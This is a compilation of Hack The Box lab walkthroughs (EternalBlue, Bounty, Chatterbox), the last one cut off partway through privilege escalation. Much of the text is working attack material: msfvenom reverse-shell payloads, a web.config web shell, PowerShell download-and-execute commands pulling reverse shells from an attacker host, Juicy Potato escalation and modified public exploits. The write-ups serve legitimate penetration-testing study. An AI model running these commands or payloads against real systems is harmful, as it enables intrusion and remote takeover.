```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _nmap/initial_

We get back the following result showing that nine ports are open:

* **Port 139:** running Microsoft Windows netbiois-ssn
* **Port 445:** running microsoft-ds
* **Ports 135, 49152, 49153, 49154, 49155, 49156 & 49157:** running msrpc

![](https://miro.medium.com/max/720/1*aWpgvwmieDHzim-Y9yuWdA.png)

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p- -oA full 10.10.10.40
```

We get back the following result. No other ports are open.

![](https://miro.medium.com/max/722/1*Dnbg_3iLC7Jhjfppa5ifUA.png)

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -p- -oA udp 10.10.10.40
```

I managed to root the box and write this blog, while this UDP scan still did not terminate. So instead I ran another UDP scan only for the top 1000 ports.

![](https://miro.medium.com/max/616/1*SJ5I5l3C1AkXoHQHLBhS6A.png)

## Enumeration <a id="6d58"></a>

As usual, we’ll run the general nmap vulnerability scan scripts to determine if any of the services are vulnerable.

```text
nmap --script vuln -oA vuln 10.10.10.40
```

![](https://miro.medium.com/max/720/1*jtetoe9Kw49xPZEG-aOWyw.png)

The box is vulnerable to EternalBlue! And guess what the EternalBlue exploit does? It gives me system access, so this box won’t be too difficult to solve. If you’re not familiar with EternalBlue, it exploits Microsoft’s implementation of the Server Message Block \(SMB\) protocol, where if an attacker sent a specially crafted packet, the attacker would be allowed to execute arbitrary code on the target machine.

## Exploitation <a id="19ce"></a>

Search for a non Metasploit exploit in the Exploit Database.

```text
searchsploit --id MS17-010
```

![](https://miro.medium.com/max/907/1*Kg0NgJlUKTIs3fBA7iCk6w.png)

We’re working with Windows 7 so we’ll use exploit \# 42315. Clone the exploit into the working directory.

```text
searchsploit -m 42315
```

After looking at the source code, we need to do three things:

1. Download mysmb.py since the exploit imports it. The download location is included in the exploit.
2. Use MSFvenom to create a reverse shell payload \(allowed on the OSCP as long as you’re not using meterpreter\).
3. Make changes in the exploit to add the authentication credentials and the reverse shell payload.

First, download the file and rename it to mysmb.py

```text
wget https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py
mv 42315.py.1 mysmb.py
```

Second, use MSFvenom to generate a simple executable with a reverse shell payload.

```text
msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.6 LPORT=4444 > eternal-blue.exe
```

Third, we need change the exploit to add credentials. In our case we don’t have valid credentials, however, let’s check to see if guest login is allowed.

If you run enum4linux, you can see that guest login is supported.

```text
enum4linux -a 10.10.10.40
```

* **-a**: Do all simple enumeration

We’ll add that to the exploit script.

![](https://miro.medium.com/max/341/1*6DCJVdyX8Hg766vfn8B0kA.png)

Similarly, we’ll add the reverse shell executable location and get the script to execute it.

![](https://miro.medium.com/max/864/1*qj1K_l6AXdFgm3PRNVi1mw.png)

Now that we’re done all three tasks, setup a listener on your attack machine.

```text
nc -nlvp 4444
```

Then run the exploit.

```text
python 42315.py 10.10.10.40
```

We have a shell with system privileges!

![](https://miro.medium.com/max/612/1*rVzn6hzA2Cz6U0tKZQAT4Q.png)

Grab the user flag.

![](https://miro.medium.com/max/622/1*F398e8JSIX_w0SYptS0D3Q.png)

Grab the root flag.

![](https://miro.medium.com/max/622/1*H9PLqvJQCxvFYeI28tTpfQ.png)

## Lessons Learned <a id="0408"></a>

I keep repeating this in most of my HTB writeup blogs and I’ll say it again, it goes without saying that you should always update your systems **especially** when updates are released for critical vulnerabilities! If the system administrator had installed the MS17–010 security update, I would have had to find another way to exploit this machine.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
bounty-writeup-w-o-metasploit.md
# Bounty Writeup w/o Metasploit

![](https://miro.medium.com/max/583/1*1tllljj4OgDrl16xtVSlvg.png)

## Reconnaissance <a id="991f"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.93 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.93Host is likely running Windows---------------------Starting Nmap Quick Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-18 22:07 EST
Nmap scan report for 10.10.10.93
Host is up (0.10s latency).
Not shown: 999 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 8.65 seconds---------------------Starting Nmap Basic Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-18 22:07 EST
Nmap scan report for 10.10.10.93
Host is up (0.041s latency).PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.24 seconds----------------------Starting Nmap UDP Scan----------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-18 22:07 EST
Nmap scan report for 10.10.10.93
Host is up.
All 1000 scanned ports on 10.10.10.93 are open|filteredNmap done: 1 IP address (1 host up) scanned in 201.65 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-18 22:11 EST
Initiating Parallel DNS resolution of 1 host. at 22:11
Completed Parallel DNS resolution of 1 host. at 22:11, 0.02s elapsed
Initiating SYN Stealth Scan at 22:11
Scanning 10.10.10.93 [65535 ports]
....
Nmap scan report for 10.10.10.93
Host is up (0.040s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  httpRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 359.73 seconds
           Raw packets sent: 131172 (5.772MB) | Rcvd: 98 (4.312KB)No new ports---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                                               
Running CVE scan on basic ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-18 22:17 EST
Nmap scan report for 10.10.10.93
Host is up (0.047s latency).PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.88 secondsRunning Vuln scan on basic ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-18 22:17 EST
Nmap scan report for 10.10.10.93
Host is up (0.039s latency).PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-IIS/7.5
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 289.06 seconds---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                                                                                                               
gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.asp,.php -u http://10.10.10.93:80 -o recon/gobuster_10.10.10.93_80.txt
nikto -host 10.10.10.93:80 | tee recon/nikto_10.10.10.93_80.txtWhich commands would you like to run?                                                                                                                                          
All (Default), gobuster, nikto, Skip <!>Running Default in (1) s:---------------------Running Recon Commands----------------------Starting gobuster scan
                                                                                                                                                                               
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.93:80
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,asp,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/18 22:22:44 Starting gobuster
===============================================================
http://10.10.10.93:80/aspnet_client (Status: 301) [Size: 159]
http://10.10.10.93:80/uploadedfiles (Status: 301) [Size: 159]
===============================================================
2020/02/18 22:23:43 Finished
===============================================================Finished gobuster scan
                                                                                                                                                                               
=========================
                                                                                                                                                                               
Starting nikto scan
                                                                                                                                                                               
- Nikto v2.1.6
--------------------------------------------------------------------
+ Target IP:          10.10.10.93
+ Target Hostname:    10.10.10.93
+ Target Port:        80
+ Start Time:         2020-02-18 22:23:45 (GMT-5)
--------------------------------------------------------------------
+ Server: Microsoft-IIS/7.5
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 2.0.50727
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ 7864 requests: 1 error(s) and 7 item(s) reported on remote host
+ End Time:           2020-02-18 22:32:51 (GMT-5) (546 seconds)
--------------------------------------------------------------------
+ 1 host(s) testedFinished nikto scan
                                                                                                                                                                               
=========================
                                                                                                                                                                                                                                                                                                                                                          
                                                                                                                                                                               
---------------------Finished all Nmap scans---------------------Completed in 25 minute(s) and 16 second(s)
```

We have one port open.

* **Port 80:** running Microsoft IIS httpd 7.5

Before we move on to enumeration, let’s make some mental notes about the scan results.

* The only port that is open is port 80 so this will definitely be our point of entry. The port is running an outdated version of Microsoft IIS. The scans didn’t report much information except for two directories _aspnet\_client_ and _uploadedfiles_ that are available on the web server.

## Enumeration <a id="d636"></a>

Visit the web application in the browser.

![](https://miro.medium.com/max/757/1*d1ATPsfn0lRf1HFLu87dRQ.png)

View the page source to see if it leaks any sensitive information.

![](https://miro.medium.com/max/872/1*7aHdHKnxc2aAoL4xyMe7RA.png)

There doesn’t seem to be anything useful. The gobuster scan reported two directories _aspnet\_client_ and uploadedfiles. They both give us a 403 error.

![](https://miro.medium.com/max/919/1*HkjAF5siq1jN-VJddw4kAA.png)

Since this is the only port open, there has to be something on this web server that gives us initial access. Let’s run another gobuster scan with a larger wordlist.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -t 30 -e -k -u http://10.10.10.93:80 -o 10.10.10.93/recon/gobuster-medium_10.10.10.93_80.txt
```

* **dir:** directory mode
* **-w:** wordlist
* **-l:** include the length of the body in the output
* **-t:** thread count
* **-e:** expanded mode, print full urls
* **-k:** skip ssl certificate verification
* **-u:** url
* **-o:** output file location

We don’t get any extra results. Let’s try adding file extensions. Since this is a Microsoft IIS server, we’ll add ASP and ASPX files.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -t 30 -e -k -x .asp,.aspx,.txt -u http://10.10.10.93:80 -o 10.10.10.93/recon/gobuster-medium-ext_10.10.10.93_80.txt
```

* **-x:** file extensions to search for

We get back the following result.

```text
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.93:80
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     asp,aspx,txt
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/18 23:38:48 Starting gobuster
===============================================================
http://10.10.10.93:80/transfer.aspx (Status: 200) [Size: 941]
```

Visit the _transfer.aspx_ page.

![](https://miro.medium.com/max/515/1*cBpjRWZgk8mB5utzdBM7RQ.png)

It’s a file upload functionality. Let’s first try and upload a PNG file.

![](https://miro.medium.com/max/520/1*HnGiuXt3Zf6kk-Tdun5Ohg.png)

We get a “_file uploaded successfully_” message. We can view the image in the _uploadedfiles_ directory that our original gobuster scan found.

![](https://miro.medium.com/max/1177/1*M5NDEZufZG3_eljs6bOWwQ.png)

This is good news! If we somehow can figure out a way to upload a file that contains ASPX code on the web server, we can execute the code by calling the file from the _uploadedfiles_ directory.

I tested the _ASP_ and _ASPX_ extensions but they both give me an “_invalid file_” error.

![](https://miro.medium.com/max/447/1*1n2iQbwqA82OFouPmTiDeA.png)

It does however accept the _.config_ extension, so we can upload a _web.config_ file. This is a configuration file that is used to manage various settings of the web server. We shouldn’t be able to upload/replace this file in the first place, but to make matters even worse, if you google “_web.config bypass upload restrictions_”, you’ll find this [link](https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/), explaining how you could get remote code execution by simply adding _ASPX_ code in the _web.config_ file.

Let’s test it out. Copy the code from [this link](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/) and save it in the _web.config_ file. The code contains _ASPX_ code that adds the integers 1 and 2 and outputs it on the screen. If we see the value 3 on the screen, we’ll know that we can run _ASPX_ code using the _web.config_ file.

Upload the file and view it.

![](https://miro.medium.com/max/565/1*_dcE0lMRhg7oQAYEjeSxsg.png)

Perfect! Now we’re pretty confident that we can get remote code execution through this upload functionality.

## Initial Foothold <a id="56d6"></a>

Remove the ASPX code from the file and replace it with the following simple web shell.

```text
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

The above code executes the _whoami_ command and outputs it on the screen. Upload the _web.config_ file and view it.

![](https://miro.medium.com/max/576/1*9yMgDaq5zXx5yedOUmROAg.png)

We definitely have code execution! Download the [Nishang](https://github.com/samratashok/nishang) repository and copy the _Invoke-PowerShellTcp.ps1_ script into your current directory.

```text
cp ../../tools/nishang/Shells/Invoke-PowerShellTcp.ps1 .
mv Invoke-PowerShellTcp.ps1 shell.ps1
```

Add the following line to the end of the script with the attack machine configuration settings.

```text
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 1234
```

When called, this sends a reverse shell back to our attack machine on port 1234.

Setup a listener to receive the reverse shell.

```text
nc -nlvp 1234
```

Next, change the _web.config_ file to download the PowerShell script and execute it.

```text
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.7:5555/shell.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

Start up a python server in the directory that the shell script resides in.

```text
python -m SimpleHTTPServer 5555
```

Upload the _web.config_ file and view it.

![](https://miro.medium.com/max/678/1*XNUp2itsgs1YEkcYHUVBBQ.png)

We get a shell! Let’s try to grab the _user.txt_ flag.

```text
PS C:\windows\system32\inetsrv> cd c:\Users\merlin\Desktop
PS C:\Users\merlin\Desktop> dir
PS C:\Users\merlin\Desktop>
```

The _Desktop_ directory seems to be empty. Let’s use the _attrib_ command to see if the file is hidden.

![](https://miro.medium.com/max/647/1*Cp3Gv6exqqckboPAHAii7g.png)

The file is there, it’s just hidden. View the _user.txt_ flag.

![](https://miro.medium.com/max/702/1*UDAbyPeDQ1eUrfqgvLTF8w.png)

## Privilege Escalation <a id="8ece"></a>

Run the _systeminfo_ command.

```text
PS C:\Users\merlin\Desktop> systeminfoHost Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          2/19/2020, 5:04:41 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,577 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,586 MB
Virtual Memory: In Use:    509 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.93
```

It’s running Microsoft Server 2008 R2 and does not have any hot fixes installed, so it’s likely vulnerable to a bunch of kernel exploits. However, before we go down this route, let’s first check the system privileges that are enabled for this user.

![](https://miro.medium.com/max/1023/1*GCpu5p5ov5sHO44q8cgzAw.png)

_SetImpersonatePrivilege_ is enabled so we’re very likely to get SYSTEM using [Juicy Potato](https://github.com/ohpe/juicy-potato). Users running the SQL server service or the IIS service usually have these privileges enabled by design. This privilege is designed to allow a service to impersonate other users on the system. Juicy Potato exploits the way Microsoft handles tokens in order to escalate local privileges to SYSTEM.

Let’s test it out. Grab the Juicy Potato executable from [here](https://github.com/ohpe/juicy-potato/releases) and transfer it to the target machine using the following command.

```text
(new-object net.webclient).downloadfile('http://10.10.14.7:5555/JuicyPotato.exe', 'C:\Users\merlin\Desktop\jp.exe')
```

Run the executable file to view the arguments it takes.

![](https://miro.medium.com/max/971/1*iiNs88XZklfmeYGSZIGwxQ.png)

It requires 3 mandatory arguments.

* **-t:** Create process call. For this option we’ll use \* to test both options.
* **-p:** The program to run. We’ll need to create a file that sends a reverse shell back to our attack machine.
* **-l:** COM server listen port. This can be anything. We’ll use 4444.

First copy the _Invoke-PowerShellTcp.ps1_ script once again into your current directory.

```text
cp ../../tools/nishang/Shells/Invoke-PowerShellTcp.ps1 .
mv Invoke-PowerShellTcp.ps1 shell-2.ps1
```

Add the following line to the end of the script with the attack configuration settings.

```text
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 6666
```

When called, this sends a reverse shell back to our attack machine on port 6666.

Next, create a _shell.bat_ file that downloads the above _shell-2.ps1_ PowerShell script and runs it.

```text
powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.7:5555/shell-2.ps1')
```

Then download the _shell.bat_ file on the target machine.

```text
(new-object net.webclient).downloadfile('http://10.10.14.7:5555/shell.bat', 'C:\Users\merlin\Desktop\shell.bat')
```

Setup a listener on the attack machine to receive the reverse shell.

```text
nc -nlvp 6666
```

Then run the Juicy Potato executable. This should attempt to get a token that impersonates SYSTEM and then run our _shell.bat_ file with elevated privileges.

```text
PS C:\Users\merlin\Desktop> ./jp.exe -t * -p shell.bat -l 4444Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM[+] CreateProcessWithTokenW OK
```

We get a shell back with SYSTEM privileges!

```text
root@kali:~/Desktop/tools/potatos# nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.93] 49175
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.PS C:\Windows\system32>whoami
nt authority\system
```

Grab the _root.txt_ flag.

![](https://miro.medium.com/max/658/1*XDRfGjfp9YG8WsO-Qdb_vA.png)

## Lessons Learned <a id="23a3"></a>

To gain an initial foothold on the box we exploited one vulnerability.

1. Insufficient input validation. The upload functionality of the website had insufficient validation on the type of files that can be uploaded. Therefore, we were able to upload a web.config file that contained ASPX code to gain an initial foothold on the system. Proper input validation checks should be put in place on all user input.

To escalate privileges we didn’t necessarily exploit a vulnerability but an intended design of how Microsoft handles tokens. So there’s really not much to do there but put extra protections in place for these sensitive accounts. That’s not to say that this box was not vulnerable to a bunch of kernel exploits. We saw that it is a Windows 2008 OS that has no patches installed. So if we didn’t escalate privileges using Juicy Potato, we could have easily done so using the many kernel exploits that this box is vulnerable to.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
chatterbox-writeup-w-o-metasploit.md
# Chatterbox Writeup w/o Metasploit

![](https://miro.medium.com/max/597/1*9HpPZa8NMVpxMHQTxybI6g.png)

## Reconnaissance <a id="8cb6"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.74 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.74
                                                                                                                                                       
                                                                                                                                                       
---------------------Starting Nmap Quick Scan---------------------                                                                                     
                                                                                                                                                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 22:27 ESTroot@kali:~/Desktop/htb/chatterbox# rm -r 10.10.10.74/
root@kali:~/Desktop/htb/chatterbox# nmapAutomator.sh 10.10.10.74 AllRunning all scans on 10.10.10.74
                                                                                                                                                       
Host is likely running Windows---------------------Starting Nmap Quick Scan---------------------
                                                                                                                                                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 22:31 EST
Nmap done: 1 IP address (1 host up) scanned in 101.53 seconds---------------------Starting Nmap Basic Scan---------------------
                                                                                                                                                       
No ports in quick scan.. Skipping!
                                                                                                                                                       
                                                                                                                                                       
                                                                                                                                                       
----------------------Starting Nmap UDP Scan----------------------                                                                                     
                                                                                                                                                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 22:33 EST
Nmap scan report for 10.10.10.74
Host is up.
All 1000 scanned ports on 10.10.10.74 are open|filteredNmap done: 1 IP address (1 host up) scanned in 201.64 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 22:36 EST
Initiating Parallel DNS resolution of 1 host. at 22:36
Completed Parallel DNS resolution of 1 host. at 22:36, 0.12s elapsed
Initiating SYN Stealth Scan at 22:36
Scanning 10.10.10.74 [65535 ports]
Nmap scan report for 10.10.10.74
Host is up (0.043s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE
9256/tcp open  unknownRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27674.79 seconds
           Raw packets sent: 131092 (5.768MB) | Rcvd: 148 (11.472KB)Making a script scan on all ports
                                                                                                                                                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-21 06:18 EST
Nmap scan report for 10.10.10.74
Host is up (0.042s latency).PORT     STATE SERVICE VERSION
9256/tcp open  achat   AChat chat systemService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.25 seconds---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                       
Running CVE scan on all ports
                                                                                                                                                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-21 06:18 EST
Nmap scan report for 10.10.10.74
Host is up (0.035s latency).PORT     STATE SERVICE VERSION
9256/tcp open  achat   AChat chat systemService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.76 secondsRunning Vuln scan on all ports
                                                                                                                                                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-21 06:18 EST
Nmap scan report for 10.10.10.74
Host is up (0.039s latency).PORT     STATE SERVICE VERSION
9256/tcp open  achat   AChat chat system
|_clamav-exec: ERROR: Script execution failed (use -d to debug)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.27 seconds---------------------Finished all Nmap scans---------------------
```

We have one port open.

* **Port 9256**: ****running AChat chat system

Before we move on to enumeration, let’s make some mental notes about the scan results.

* Port 9256 is running some kind of chat system that I’m not familiar with, so the first we’ll do is google it to figure out what it is. Then we’ll run searchsploit on it to see if it is associated to any known vulnerabilities.

## Enumeration <a id="ad33"></a>

Doing a quick google search on the service tells us that AChat is a software that enables you to chat on your local network. It can also be used to share and send files/images to other users.

Now that we know what it is, let’s run searchsploit on it.

![](https://miro.medium.com/max/1174/1*-bEFqyrr_dYyPmeSzTn68A.png)

It’s vulnerable to a remote buffer overflow and there is both apython and metasploit exploit for it. We will of course work with the non-metasploit solution.

Copy the python script to your current directory.

```text
searchsploit -m 36025
```

Looking at the exploit code we make note of the following things:

* It looks like your classic stack buffer overflow that allows you to overflow the buffer and include malicious shell code that will get executed on the box.
* The exploit author was nice enough to give us the msfvenom command that generates the malicious payload \(_‘buf’_ variable\) including the bad characters to avoid. This makes our life so much easier! The command simply spawns the _calc.exe_ program on the target machine. So we’ll have to change the command to send a reverse shell back to our attack machine.
* We also need to change the _server\_address_ to that of the IP address of Chatterbox.
* There seems to be a length limit of 1152 bytes on the payload. Anything that exceeds that will probably not work. We’ll keep that in mind when using msfvenom to generate our reverse shell.

## Initial Foothold <a id="c189"></a>

Use msfvenom to generate the reverse shell payload.

```text
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=1234 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

We get back the following result.

```text
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 774 (iteration=0)
x86/unicode_mixed chosen with final size 774
Payload size: 774 bytes
Final size of python file: 3767 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
......[truncated]
```

The payload size is 774 bytes, so within the limit. Copy the payload and add it in place of the payload included in the exploit. Also change the IP address to Chatterbox’s IP address.

```text
# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.10.10.74', 9256)
```

Then setup a listener on the attack machine to receive the reverse shell.

```text
nc -nlvp 1234
```

Run the exploit.

```text
root@kali:~/Desktop/htb/chatterbox# python 36025.py 
---->{P00F}!
```

We get a shell!

![](https://miro.medium.com/max/882/1*XK-pIFAJyBDZVuw7RA4MSQ.png)

Grab the _user.txt_ flag.

![](https://miro.medium.com/max/611/1*AxvyV0VE64vlTeih-UKZIA.png)

We’re running as a low privileged user, so we’ll need to escalate privileges.

## Privilege Escalation <a id="ff1c"></a>

Display the user account information.

![](https://miro.medium.com/max/609/1*pLWQwPKFiIv4iXor0MDgFg.png)

Next, view all the users on the system.

![](https://miro.medium.com/max/847/1*FN02_FJZDN_YRYV1aOoL8A.png)

We have three users. The user we want to compromise is the _Administrator_ account.

Next, let’s check the system privileges that are enabled for the _Alfred_ user.

![](https://miro.medium.com/max/1121/1*AY1Fl2DcrI9awi36T9HAiA.png)

_SetImpersonatePrivilege_ is not enabled so we can’t use the [Juicy Potato](https://github.com/ohpe/juicy-potato) exploit to escalate privileges.

Run the _systeminfo_ command.

![](https://miro.medium.com/max/731/1*4AAvQEZjyYtSnMdNPGmCpQ.png)

The box has 208 hotfixes installed so it’s unlikely that we can escalate privileges using a kernel exploit \(although it might be possible, I haven’t checked\).

Let’s see if we have access to the _Administrator_ directory.

![](https://miro.medium.com/max/570/1*a-mG45BDsR8lCDFPA3F2Rg.png)

We do. That’s odd. Let’s try and view the _root.txt_ flag.

![](https://miro.medium.com/max/544/1*qutamKZ9EZ4eniFYXdOn2Q.png)

We don’t have permission. View the permissions on the _root.txt_ file.

![](https://miro.medium.com/max/658/1*Io9LZSrwpeVl5r86ZbLR9Q.png)

Only _Administrator_ has full access \(F\) on this file. Let’s view the permissions on the _Desktop_ directory. We must have some kind of permission on it because we’re able to enter it.

